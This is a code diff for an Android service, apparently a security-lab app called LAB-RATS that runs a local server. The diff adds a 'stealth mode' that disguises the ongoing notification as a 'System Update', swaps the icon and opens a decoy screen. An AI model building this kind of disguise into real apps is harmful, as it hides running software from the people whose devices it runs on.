@@ -249,22 +249,37 @@ else if ("STOP".equals(action)) {
         }
     }
 
+    private boolean isStealthMode() {
+        android.content.ComponentName fakeAlias = new android.content.ComponentName(this, "com.labs.labrats.SystemUpdateAlias");
+        return getPackageManager().getComponentEnabledSetting(fakeAlias) == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED;
+    }
+
     private Notification createNotification() {
-        Intent notificationIntent = new Intent(this, MainActivity.class);
+        boolean stealth = isStealthMode();
+        
+        Intent notificationIntent = new Intent(this, stealth ? DecoyActivity.class : MainActivity.class);
         PendingIntent pendingIntent = PendingIntent.getActivity(
                 this, 0, notificationIntent,
                 PendingIntent.FLAG_IMMUTABLE);
 
         String ip = MainActivity.getLocalIpAddress();
         String formattedIp = (ip != null && ip.contains(":")) ? "[" + ip + "]" : ip;
-        String contentText = ip != null
+        
+        String title = stealth ? "System Update" : "🛡️ LAB-RATS Active";
+        String contentText;
+        
+        if (stealth) {
+            contentText = "Checking for system updates...";
+        } else {
+            contentText = ip != null
                 ? "Server running at http://" + formattedIp + ":8080"
                 : "Server running on port 8080";
+        }
 
         return new NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("🛡️ LAB-RATS Active")
+                .setContentTitle(title)
                 .setContentText(contentText)
-                .setSmallIcon(R.mipmap.ic_launcher)
+                .setSmallIcon(stealth ? R.drawable.ic_sprocket_gear : R.mipmap.ic_launcher)
                 .setContentIntent(pendingIntent)
                 .setOngoing(true)
                 .setPriority(NotificationCompat.PRIORITY_LOW)
